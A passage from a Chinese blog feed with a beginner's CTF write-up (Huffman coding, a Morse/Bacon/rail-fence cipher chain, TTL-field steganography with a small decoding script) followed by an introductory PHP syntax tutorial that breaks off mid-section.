        <content type="html"><![CDATA[<p>上个周做了一道MISC题和两道Crypto题。感觉还是总结一下比较好，毕竟做题时查了很多大佬的博客和一些知识点。</p><h3 id="1、Crypto-哈夫曼树和哈夫曼编码"><a href="#1、Crypto-哈夫曼树和哈夫曼编码" class="headerlink" title="1、Crypto-哈夫曼树和哈夫曼编码"></a>1、Crypto-哈夫曼树和哈夫曼编码</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOGI5NTVlZTlhNGZjZjc2Mi5wbmc" alt></p><p>刚看到这道题时我毫无头绪。毕竟在写这篇博客时，还没有学过数据结构。而哈夫曼树是数据结构里的一个重要部分。于是我便在百度上搜索有关哈夫曼树和哈夫曼编码的知识。。。。。。。。</p><h4 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h4><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvM2Y3OTI3MTM4YmYxOTc4ZS5wbmc" alt></p><p>哈夫曼最大的目的是为了解决当你远距离通信(电报)的数据传输的最优化问题</p><p>路径：树中一个结点到另一个结点之间的分支序列构成两个结点间的路径<br>路径长度：路径上的分支数目<br>树的路径长度：树根到每个结点的路径长度的和<br>结点带权路径长度：结点到树根的路径长度与结点的权的乘积<br>树的带权路径长度：树中所以叶子结点的带权路径长度之和（WPL）</p><h4 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h4><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZmU4MDMwMjQ4NDgyYzYxZi5wbmc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGI0NzZiYzJhYmUwMmM0Ni5wbmc" alt></p><p>学习完这些知识点后，我对哈夫曼树和哈夫曼编码有了大致的了解，就是找最优二叉树，然后哈夫曼编码就是<u>根据每个字母的出现频率不同，按照它们的权值进行构造哈夫曼树。</u><u>将所有权值左分支改为0，右分支改为1，得到相应字符的的传输数据</u>。</p><p>然后，下载解压下载的题目文件，发现一个txt文件，打开后</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjdjNWQwNGI0MjQ4NGVkMi5wbmc" alt></p><p>果然，是哈夫曼编码，由于我现在的编程能力，写不出有关的编码脚本。所以我画了一个哈夫曼树</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjIwN2EzMzk0YTdlYmQ2ZC5qcGc" alt></p><p>根据txt文件，我猜想前五位编码应该是<strong>flag{</strong>，最后一位是<strong>}</strong>，然后根据这六位编码，调整最底下的<strong>g、l、{、}</strong>的位置。然后得到每个字符的分配权值：</p><p><strong>a：000</strong></p><p><strong>d：10(或01)</strong></p><p><strong>g：00101</strong></p><p><strong>f：110</strong></p><p><strong>l：00111</strong></p><p><strong>0：111</strong></p><p><strong>5：01(或10)</strong></p><p><strong>{：00100</strong></p><p><strong>}：00110</strong></p><p>然后把txt文件里的0和1按照上述权值进行分隔</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYjBlMjk2OTcyZmZlMDY1Yi5wbmc" alt></p><p>然后比对每个字符的权值，对分隔好的0和1，进行编码，最终得到两个结果</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODZhZTlmYThiNjk4YTBmZC5wbmc" alt></p><p>然后最终答案就是其中的一个啦！！！！</p><h3 id="2、Crypto-滴答滴答"><a href="#2、Crypto-滴答滴答" class="headerlink" title="2、Crypto-滴答滴答"></a>2、Crypto-滴答滴答</h3><p>这道题题目没有给任何提示，下载文件，发现并不能打开和用winrar解压文件。于是我便选择用notepad++打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDc4ZDYzZjM1NGQ0NzE0MC5wbmc" alt></p><p>很显然这是摩斯电码，进行解码得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYmRjZTViNjM3ODUwYWFjNC5wbmc" alt></p><p>发现第一个斜杠前有一串特别的字母MORSEISCOOLBUTBACONISCOOLER仿佛看不太懂，写成小写字母morseiscoolbutbaconiscooler很明显，这句话的意思是“摩斯是酷的，但是培根是更酷的”，那么接下来就应该进行培根解密，直接解密，发现不行。查了查培根加密的格式发现，并没有斜杠<strong>“/”</strong>，于是我用notepad++的替换功能把所有的斜杠去掉，然后培根解密得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMmU4MTg5NWJlY2IxNjRjOS5wbmc" alt></p><p>“DO YOU KNOW THE FOUR FENCE ZGIAHYANAUOZNXWI”用百度翻译的意思是“你知道四道栅栏吗？”，可以想到接下来是栅栏密码解密，且每组字数为4。我把所有字符进行解密，发现并没有解出有意义的字符。所以我把“ZGIAHYANAUOZNXWI”进行栅栏解密，最后得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMWM0MDY4YTQ5MzE3ZDE3Yi5wbmc" alt></p><p>很显然最终结果出来了，下面进行提交，发现错误。这就应该是格式的问题了，调过之后成功提交了。。</p><h3 id="3、MISC-TTL字段"><a href="#3、MISC-TTL字段" class="headerlink" title="3、MISC-TTL字段"></a>3、MISC-TTL字段</h3><p>从题目中，我们可以知道这道题是TTL字段。然而对此我有点懵，从来没有接触过它。于是我便查有关资料和一些大佬的博客</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjk2YTM4ODlhNGYwZGYwNi5wbmc" alt></p><p>下载解压题目文件，发现ttl.txt文件，打开发现ttl.txt中的ttl只有4个值<strong>63,127,191,255</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzlmMGYxYjVjMmJlMTNmYi5wbmc" alt></p><p>写出他们的二进制表示后发现只有最高两位不同，<strong>63-00111111、127-01111111、191-10111111、255-11111111</strong>。于是把4个值替换成<strong>00、01、10、11</strong>如果传输4个就是一字节，取前面的2位组成8位，对照二进制字母表，可以发现前面是ffd8，jpg图片标志</p><p>因为这个脚本我写不出来，于是用了大佬的脚本</p><pre><code class="python">fp = open(&#39;ttl.txt&#39;,&#39;r&#39;)a = fp.readlines()p = []for i in a:    p.append(int(i[4:]))s = &#39;&#39;for i in p:    if i == 63:        a = &#39;00&#39;    elif i == 127:        a = &#39;01&#39;    elif i == 191:        a = &#39;10&#39;    elif i == 255:        a = &#39;11&#39;    s += a# print(s)import binasciiflag = &#39;&#39;for i in range(0,len(s),8):    flag += chr(int(s[i:i+8],2))flag = binascii.unhexlify(flag)wp = open(&#39;res.jpg&#39;,&#39;wb&#39;)wp.write(flag)wp.close()#00111111 63#01111111 127#10111111 191#11111111 255</code></pre><p>然后把ttl.txt和这个脚本(脚本文件名我写成了1.py)放在同一路径，在cmd命令行输入命令<code>python 1.py</code>生成了一个fi.txt文件，打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGFiNTNkNTNlYzYwMTBkZC5wbmc" alt></p><p>这是16进制编码，所以把这些编码粘贴在winhex里生成一个jpg文件，打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZjdlYzE4M2RkMzJiZGM5MC5wbmc" alt></p><p>发现只有二维码的一部分，在最后转换出的结果中，发现了六个jpg的文件头（ffd8），说明这就是六张图片，用foremost直接分开(或用strgsolve分离图片)就好了，之后用ps(或ppt)拼在一块</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTVhNmM1NWM2ZjE1NzhjNy5wbmc" alt></p><p>扫描结果如下所示：</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvM2Y0MzljMmNiNTQyZWU2YS5wbmc" alt></p><p>应该就是AutoKey(自动密钥密码)那个加密，找了个在线网站解密得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDk3MWZjYWVmNDRiNjg2Yi5wbmc" alt></p><p>得到最终flag了！！！！！</p><p>这便是我上周做题的总结，小白进阶ing，欢迎大佬批评指正！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发-PHP基础篇(一-二)</title>
      <link href="/2019/04/15/Web%E5%BC%80%E5%8F%91-PHP%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%80~%E4%BA%8C)/"/>
      <url>/2019/04/15/Web%E5%BC%80%E5%8F%91-PHP%E5%9F%BA%E7%A1%80%E7%AF%87(%E4%B8%80~%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h3 id="学前准备"><a href="#学前准备" class="headerlink" title="学前准备"></a>学前准备</h3><p>学前准备：html、css</p><p>PHP超文本预处理器</p><p>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。</p><p>php擅长网站开发   php吸收c java perl</p><p>允许网站开发人员快速编写的动态页面（信息的更新)</p><p>php可以运行在windows，linux等各种操作系统上！</p><p><strong>浏览器&gt;输入url地址&gt;显示网站内容</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716155130484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p> 网络主机(硬件)运行 Web服务器(软件)</p><p><strong>apache管理web服务器</strong></p><p><strong>php应用服务器执行php代码，交给apache</strong></p><p><strong>mysql数据库管理系统  可单独安装一台计算机里</strong></p><p><strong>url地址</strong></p><p><strong>格式：</strong><code>http://host[:port][abs_path]</code></p><p><strong>理解：</strong></p><p><code>http://</code>表示要通过HTTP协议定位网络资源</p><p><code>host</code>表示合法的internet主机域名或者ip地址</p><p><code>port</code>指定一个端口号，可以省略默认为<strong>80端口</strong></p><p><code>abs_path</code>被请求资源的位置</p><p>DNS服务器：<code>IP    域名</code></p><h3 id="一、PHP基本语法"><a href="#一、PHP基本语法" class="headerlink" title="一、PHP基本语法"></a>一、PHP基本语法</h3><h4 id="1、初识PHP脚本程序"><a href="#1、初识PHP脚本程序" class="headerlink" title="1、初识PHP脚本程序"></a>1、初识PHP脚本程序</h4><p><strong>1.PHP语言标记</strong><br>(1)PHP开始标记        </p><pre><code class="php">&lt;?php</code></pre><p>(2)PHP结束标记        </p><pre><code class="php">?&gt;</code></pre><pre><code class="php">//完整开始结束写成：&lt;?php ?&gt;</code></pre><p>php解析器叫做PHP应用服务器</p><p>(3)我们的页面最终是通过html,css,js来展示出一个炫丽的界面<br>(4)<strong>PHP代码可以嵌入到html代码中任何位置</strong>，并且可以嵌入任意多个</p><p><img src="http://img-blog.csdnimg.cn/20190716155155222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190716155207657.png" alt="在这里插入图片描述"><br>(5)文件末尾的<code>?&gt;</code>结束标志可以省略<br><strong>2.指令分隔符”;”</strong><br>(1)在一些PHP语句的结尾要加上;表示一句话的结束,当然 也不需要可以的去记，因为你一旦漏掉分号，程序根本执行不了，会报错!<br>(2)结束标记<code>?&gt;</code>就隐含了一个<code>;</code>  所以在<code>?&gt;</code>之前的PHP语句可以省略掉<code>;</code><br><strong>3.注释</strong><br>(1)多行注释</p><pre><code class="php">/*    多行注释*/</code></pre><p>(2)单行注释</p><pre><code class="php">//我是单行注释</code></pre><p><strong>4.遇到空白的处理</strong><br>空格，tab制表符，换行 (在英文输入法中)这些写在咱们的PHP代码里面是没有问题的。   可以利用这些空白 来增加我们代码的清晰性和可读性!</p><h4 id="2、变量"><a href="#2、变量" class="headerlink" title="2、变量"></a>2、变量</h4><p>变量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器</p><p><strong>1.变量的声明</strong><br>    在我们一些编程语言里面比如C语言 使用变量之前要事先通知，事先声明一下！ <strong>注意：</strong>在我们的PHP程序里面 使用变量之前是*<u>不需要声明</u>*的！</p><p>变量用于存储 数字、文本字符串 或者数组这些数据!</p><pre><code class="php">$变量名=数据(值)</code></pre><p><code>=</code> 在数学里面是‘等于’的意思,在我们的程序语言里面，它不是等于号，它是  ‘赋值操作符’</p><p><strong>2.变量的释放(销毁)</strong></p><pre><code class="php">unset($变量名称)$and1=1;unset($and1);//销毁$and1变量echo $and1;//提示出错，因为变量已经被销毁了！</code></pre><p><strong>3.变量的命名规则</strong><br>(1)变量名称严格区分大写<br><code>$name,$NAME,$Name</code>都是不同的变量<br>(2)字母或者下划线开头，后面接任意数量的字母数字下划线都可以!</p><p>例：</p><pre><code class="php">$nameudhfdjkjv$_1464fbgrf</code></pre><p>错误的命名方式：</p><pre><code class="php">$1name  错误点：以数字开头了$n ame  错误点：中间有空白字符</code></pre><p>*<u>总结一下：</u><strong>*变量名只能包含 字母 数字 下划线 并且必须以字母或者下划线开头</strong>！</p><p>(3)最好不要用一些关键字作为变量名称(因为在其他的编程语言里面是完全不被允许的)!</p><p>关键字：</p><p><img src="http://img-blog.csdnimg.cn/2019071615524178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>4.可变变量</strong></p><pre><code class="php">//可变变量$abc=&#39;test&#39;;//定义了一个变量$abc里面存了值test$$abc=&#39;小明&#39;;//$test=&#39;小明&#39;;echo $test;</code></pre><p><strong>5.变量的引用赋值</strong></p><pre><code class="php">$a=1000;/*$b=$a;//相当于把$a的值，复制一份再赋值给$b这个变量*/$b=&amp;$a;//相当于给$a起了一个别名，操作其中任何一个，都会影响到另外一个变量的值!$b=20;echo $a;</code></pre><h4 id="3、变量类型"><a href="#3、变量类型" class="headerlink" title="3、变量类型"></a>3、变量类型</h4><p>概述：变量类型是指保存在该变量中的数据类型。PHP(弱类型语言)对变量类型看的比较淡</p><p>使用var_dump(变量名)可以输出变量的类型和变量值！</p><p><strong>1.变量类型简介</strong></p><p>(1）bool (布尔型)</p><pre><code class="php">$a=true;var_dump($a);</code></pre><p>往变量里面存true或false，那这个变量就是布尔型</p><p>(2）int (整型)</p><p>往变量里面存整数，那这个变量就是整型</p><p>(3）float (浮点型，也称double)</p><pre><code class="php">$a=1.1;var_dump($a);</code></pre><p>往变量里面存小数，那这个变量就是浮点型</p><p>(4）string (字符串)</p><p>字符串就是是一系列的字符组成串在一起</p><p><em>1单引号：</em></p><pre><code class="php">$b=1;$a=&#39;qwzftest..&#39;;var_dump($a);echo $a;</code></pre><p><u>单(双)引号里不能直接放单引号！！要放单引号，需要在单引号前加反斜杠<code>\</code>转义</u></p><p>如：</p><pre><code class="php">$a=&#39;qwzftest\&#39;afc&#39;;</code></pre><p>单引号里的变量不会被解析。所以在定义一些简单的字符串的时候使用单引号，效率比较高</p><p><em>2双引号</em></p><pre><code class="php">$b=100;$a=&#39;te$bst......&#39;;$a=&quot;te{$b}st......&quot;;//双引号里的变量$b({$b})会被解析var_dump($a);echo $a;</code></pre><p> <em>3定界符</em></p><pre><code class="php">$b=200;$a=&lt;&lt;&lt;wwwdwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwecwww;var_dump($a);</code></pre><p>(5）array (数组)</p><p>(6）object (对象)</p><p>(7）resource (资源)</p><p>(8）NULL<br>null表示一个变量没有值，表示空<br>将变量直接赋值为null<br>声明的变量尚未被赋值<br>被unset函数销毁的变量</p><pre><code class="php">$a=1234;unset($a);var_dump($a);</code></pre><p><strong>2.变量类型相互转换</strong></p><p>强制转换:</p><pre><code class="php">$a=&#39;小明&#39;;$b=(int)$a;var_dump($a);var_dump($b);</code></pre><h4 id="4、常量"><a href="#4、常量" class="headerlink" title="4、常量"></a>4、常量</h4><p><strong>1.概念：</strong>常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器<br><strong>2.定义和使用</strong></p><p><code>define(&#39;常量名称&#39;,常量值) 或者 define(&quot;常量名称&quot;,常量值)</code></p><p><em>常量的命名：</em><br>(1)和变量一样 <strong>只能包含字母数字下划线 并且必须以 字母或者下划线开头</strong><br>(2)按照惯例常量名字总是大写的<br>(3)自定义的常量是严格区分大小写的<br><u>defined()函数来检查是否定义了某个常量</u></p><p><strong>3.常量和变量的区别</strong></p><p>(1)常量前面没有美元符号($)<br>(2)常量只能用define()函数定义，不能通过赋值语句<br>(3)常量可以不用理会变量范围的规则而在任何地方定义和使用<br>(4)常量一旦被定义就不能被重新定义或者取消定义<br>(5)常量的值只能是bool,int,float,string类型</p><p><strong>4.预定义常量</strong></p><p>预定义常量就是PHP内核已经帮我们定义好的常量</p><p>其中有的预定义常量是<code>一__</code>开头的，这些预定义常量我们又叫它魔术常量</p><p>代码所在的位置不同,值也是不同的，所以它叫<code>魔术常量</code><br>八个常用的魔术常量</p><p><img src="http://img-blog.csdnimg.cn/20190716155307406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>预定义常量是不区分大小写的</p><h4 id="5、运算符"><a href="#5、运算符" class="headerlink" title="5、运算符"></a>5、运算符</h4><p><strong>概述：</strong>一些符号，这些符号可以将变量或者数据执行某中运算！<br><strong>1.算术运算符</strong><br>(1)<code>+</code></p><pre><code class="php">$a=1;$b=2;$c=$a+$b;echo $c;</code></pre><p>(2)<code>-</code><br><em>第一个意思： 减号</em></p><pre><code class="php">$a=10;$b=2;$c=$a-$b;echo $c;</code></pre><p><em>第二个意思： 取反</em></p><pre><code class="php">$a=1;$b=-$a;echo $b;//-1echo &#39;&lt;br /&gt;&#39;;echo $a;//1</code></pre><p><strong>注意：取反并不会影响到被取反变量本身的值!</strong><br>(3)<code>*</code> 乘号</p><pre><code class="php">$a=4;$b=2;$c=$a*$b;echo $c;</code></pre><p>(4)<code>/</code> 除号</p><pre><code class="php">$a=10;$b=2;$c=$a/$b;echo $c;</code></pre><p>(5)<code>%</code> 取模</p><pre><code class="php">$a=12;$b=2;echo $a%$b;</code></pre><p>(6)<code>++</code> 自增<br><em>前++</em><br>当在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！</p><pre><code class="php">$a=10;echo ++$a;//11</code></pre><p><em>后++</em><br>当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增</p><pre><code class="php">$a=10;//++$a;//$a=$a+1;//$a++;//$a=$a+1;echo $a++;//echo $a;$a=$a+1;echo &#39;&lt;br /&gt;&#39;;echo $a;//11    </code></pre><p><strong>注意：</strong></p><pre><code class="php">$a=10;++$a;//这种情况不需要用到自增变量值的时候，和后++无区别echo $a;</code></pre><p>(7)<code>--</code> 自减<br><em>前–</em></p><pre><code class="php">$a=10;//$a--;//$a=$a-1; 和--$a没区别;echo --$a;//$a=$a-1;echo $a;echo &#39;&lt;br /&gt;&#39;;echo $a;</code></pre><p><em>后–</em></p><pre><code class="php">$a=10;//$a--;//$a=$a-1; 和--$a没区别;echo $a--;//echo $a;$a=$a-1;echo &#39;&lt;br /&gt;&#39;;echo $a;</code></pre><p><strong><u>注意：自增或者自减是对变量而言的！</u></strong></p><p><strong>2.字符串运算符</strong></p><pre><code class="php">. 连接运算符$a=&#39;小明&#39;;$b=&#39;测试字符串连接符&#39;;echo $a.$b;</code></pre><p><strong>3.赋值运算符</strong><br><strong>注意：</strong><br>赋值运算符整个语句是有值的，所以整个语句就是一个表达式，所以我们也可以这么写：<br><code>$a=$b=2;</code>相当于<code>$a=($b=2);</code>也相当于<code>$a=2;$b=2;</code><br><code>=</code>  把右边的值赋给左边的变量<br><code>$a=1;</code><br>二元运算符</p><p>表达式是 PHP 最重要的基石。在 PHP 中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是“任何有值的东西”。</p><pre><code class="php">+=$a=1;$b=2;$a+=$b;//$a=$a+$b;echo $a;</code></pre><pre><code class="php">-=$a=2;$b=1;$a-=$b;//$a=$a-$becho $a;</code></pre><p><strong>4.比较运算符</strong><br><em>概念：*对操作数（按照比较运算符的要求,规则）进行比较。如果比较出的结果满足比较运算符的要求那么结果就是<u>true(真，成立，满足)</u>,否则就是<u>false（假，不成立,不满足）</u><br>*PHP中规定：</em><br>使用<code>echo</code>输出布尔类型值的时候<br><code>echo true;</code>它在页面中会输出1<br><code>echo false;</code>它会在页面中什么都不输出<br>所以说我们在测试的过程中如果需要输出布尔类型值的时候我们最好使用<code>var_dump()</code>来输出更明了的结果！<br>(1)<code>==</code> 值是否相等<br>如果值相等则就是 true（真，成立）<br>如果值不相等那么就是false（假，不成立）</p><pre><code class="php">$a=1;$b=1;var_dump($a==$b);//true</code></pre><p>(2)<code>===</code> 全等（值要相等，类型也要相等）<br>如果两边操作数的值 全等那么就是true否则就是false</p><pre><code class="php">$a=11;$b=&#39;11&#39;;//var_dump($a==$b);//truevar_dump($a===$b);//false</code></pre><p>3)<code>!=</code> 值是否不相等<br>如果两边操作数的值不相等那么就是true，否则就是false</p><pre><code class="php">$a=1;$b=11;var_dump($a!=$b);//true</code></pre><p>(4)<code>&lt;&gt;</code> 同上<br>(5)<code>!==</code> 不全等<br>如果两边的操作数不全等那么就是true，否则就是false</p><pre><code class="php">/*$a=1111;$b=2;var_dump($a!=$b);//truevar_dump($a!==$b);//true*/$a=11;$b=&#39;11&#39;;var_dump($a!=$b);//falsevar_dump($a!==$b);//true,$a不全等于$b</code></pre><p>(6)<code>&lt;</code> 小于<br>比较两边操作数的值，前面的是否小与后面的</p><pre><code class="php">$a=1;$b=1;var_dump($a&lt;$b);//false,$a小与$b这句话正确还是错误</code></pre><p>(7)<code>&gt;</code> 大于</p><pre><code class="php">$a=10;$b=1;var_dump($a&gt;$b);</code></pre><p>(8)<code>&lt;=</code> 小于等于</p><pre><code class="php">$a=1;$b=1;var_dump($a&lt;=$b);//$a小与等于$b就是true,否则就是false</code></pre><p>(9)<code>&gt;=</code> 大于等于</p><pre><code class="php">$a=2;$b=1;var_dump($a&gt;=$b);//true</code></pre><p>​            </p><p><strong>5.逻辑运算符</strong><br>概念：对表达式进行逻辑运算，运算出的结果是布尔类型的值（true,false）<br>要求：参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！<br>(1)逻辑与<br>and 或者 &amp;&amp;<br>运算规则：左右两边的表达式的值都为true的时候，运算的结果就是true<br>        否则只要其中任意一个为false，运算的结果就是false;<br>现实举例：<br>        true 及格<br>        false 不及格<br>        左右两边的表达式就是我们要考试的科目;<br>要求：当语文和数学都及格的时候那么，最终的结果才能够通过(true),否则就是不通过(false)</p><pre><code class="php">$a=false;//语文$b=true;//数学var_dump($a &amp;&amp; $b);</code></pre><p>*<u>中间隐含一个问题：“短路”,运算符的优先级的问题！</u>*<br>我们的程序语言的设计者认为：</p><p>只要有逻辑运算符 （逻辑与，逻辑或）那么运算结果就是就是一个true或者false<br>那个这个整个运行的过程就不重要了！<br>当然短路问题并不会遇到太多，就算遇到也不会有什么影响！</p><p>(2)逻辑或<br>or 或者 ||<br>运算规则：左右两边的表达式的值有一个为true，运算的结果就是true，只有当两边的值都是false的时候，结果才会是false</p><p>例：</p><pre><code class="php">$a=false;//语文$b=true;//数学var_dump($a || $b);        </code></pre><p>现实举例：<br>要求：当语文和数学有一门及格那么最终的结果就是通过true<br><u><em>中间隐含一个问题：“短路”,运算符的优先级的问题！</em></u><br>我们的程序语言的设计者认为：</p><p>只要有逻辑运算符 （逻辑与，逻辑或）那么运算结果就是就是一个true或者false<br>那个这个整个运行的过程就不重要了！<br>当然短路问题并不会遇到太多，就算遇到也不会有什么影响！</p><p>(3)逻辑异或<br>xor<br>运算规则：左右两边的表达式的值不一样的时候结果就是true,如果一样那么运算的结果就是false</p><p>例：</p><pre><code class="php">$a=false;$b=false;var_dump($a xor $b);</code></pre><p>(4)逻辑非<br>!<br>运算规则：将原来表达式的值否定掉，原来是true，那么结果就是false。原来是false，那么结果就是true<br><strong>6.位运算符</strong><br><strong>7.其他运算符</strong><br>(1)<code>? :</code><br>三元运算<br>格式：</p><pre><code class="php">表达式1 ? 表达式2 : 表达式3;如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3$a=false ? 10 : 20;echo $a;//20</code></pre><p>(2)<code>可以把系统的命令放在里面执行！涉及到跨平台:</code></p><pre><code class="php">$a=`ipconfig`;$b=`ifconfig`;var_dump($b);</code></pre><p>(3)<code>@</code><br>屏蔽表达式可能发生错误！<br><code>echo @$a;</code><br>(4)<code>=&gt;</code><br>(5)<code>-&gt;</code><br>(6)<code>instanceof</code><br><strong>8.运算符的优先级</strong><br><em>优先级的概念：*谁的优先级别高就先算谁<br>结合方向：规定了从那个方向开始算的问题！<br>*优先级归纳:</em><br>(1)[无]递增递减<br>(2)[右]逻辑非!<br>(3)[左]乘，除，取余<br>(4)[左]加，减，字符串连接符<br>(5)[无]包含大于号或者小于号的比较运算符<br>(6)[无]不包含大于号或者小于号的比较运算符<br>(7)[左]逻辑与&amp;&amp;<br>(8)[左]逻辑或||<br>(9)[左]? :<br>(10)[右]赋值运算符<br>(12)[左 ]逻辑异或xor<br>圆括号的作用：<br>用圆括号可以将表达式里面的某一块看成一个整体！<br>使用括号可以增强代码的可读性。</p><h3 id="二、流程控制"><a href="#二、流程控制" class="headerlink" title="二、流程控制"></a>二、流程控制</h3><p>对PHP程序执行的过程进行控制！</p><h4 id="1、顺序执行"><a href="#1、顺序执行" class="headerlink" title="1、顺序执行"></a>1、顺序执行</h4><p>自上而下的执行即可！  对这个执行过程没有控制!</p><h4 id="2、分支执行"><a href="#2、分支执行" class="headerlink" title="2、分支执行"></a>2、分支执行</h4><p>分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句（if，switch）来实现！<br><strong>1.if语句</strong><br>注意：我们if语句的表达式所控制的代码，最好用花括号括起来，哪怕就是一条语句也用花括号括起来！<br> if语句可以嵌套，这是根据实际需求来的！<br>（1)单向条件<br>if(表达式) 语句1;<br>表达式的值为true 那么就执行语句1,否则就不执行！</p><p>例：</p><pre><code class="php">$pass=60;$a=40;if($a&gt;=$pass){echo &#39;恭喜，考试通过&#39;;echo &#39;dwqdwqdq&#39;;//.......各种其他语句！}echo &#39;代码执行结束！&#39;;</code></pre><p>(2)双向条件</p><p>例：</p><pre><code class="php">$pass=60;$a=40;if($a&gt;=$pass){echo &#39;恭喜你！考试通过啦！&#39;;//.......}else{echo &#39;很遗憾，您的科目没有通过！&#39;;//.......}</code></pre><p>(3)多向条件</p><p>例：</p><pre><code class="php">$a=84;$grade1=60;//低于60不及格$grade2=75;//及格$grade3=85;//良好if($a&lt;$grade1){echo &#39;不及格&#39;;}elseif($a&lt;$grade2){echo &#39;童鞋你及格了&#39;;}elseif($a&lt;$grade3){echo &#39;良好！&#39;;}else{echo &#39;优秀&#39;;}</code></pre><p><strong>2.switch语句</strong></p><pre><code class="php">switch(表达式){    case 值 1://case相当于==    语句块1;    break;    case 值 2:    语句块2;    break;    .......    default:    语句块n}</code></pre><pre><code class="php">注意点：1)表达式的值最好是整形或者字符串！2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下！4)case后面的语句块是不需要{}括起来的</code></pre><h4 id="3、循环执行"><a href="#3、循环执行" class="headerlink" title="3、循环执行"></a>3、循环执行</h4><p>计算机最擅长的功能之一就是按照规定的条件，重复执行某些操作，这是程序设计中最能发挥计算机特长的程序结构。<br><strong>1.while语句</strong></p><pre><code class="php">while(表达式){    各种语句....}</code></pre><p>当表达式的值为true,那么就执行下面的语句块，    当语句块执行结束之后，继续返回上面来判断表达式的值是true还是false，如果还是true，那么就继续执行语句块。直到这个表达式的值为false，那么这个while语句就执行结束了！</p><p>例：</p><pre><code class="php">$i=0;while($i&lt;10){echo $i++.&#39;&lt;br /&gt;&#39;;}echo &#39;执行结束了！&#39;;</code></pre><p><strong>2.do…while语句</strong></p><pre><code class="php">do{    各种语句}while(表达式);</code></pre><p><u>与while语句区别就是，do while语句至少会执行一次！</u><br><strong>3.for语句</strong></p><pre><code class="php">for(表达式a;表达式b;表达式c){    各种语句}</code></pre><p>表达式a:会放一些初始化话的语句,$i=0,放多个表达式,中间用,隔开<br>表达式b：会放一些用来判断true或者false的表达式！，也可以放多个表达式，中间用,隔开<br>表达c：会放一些对初始化的变量进行自增的语句！放多个表达式,中间用,隔开</p><pre><code class="php">表达式a表达式b 如果是true语句块表达式c表达式b</code></pre><h4 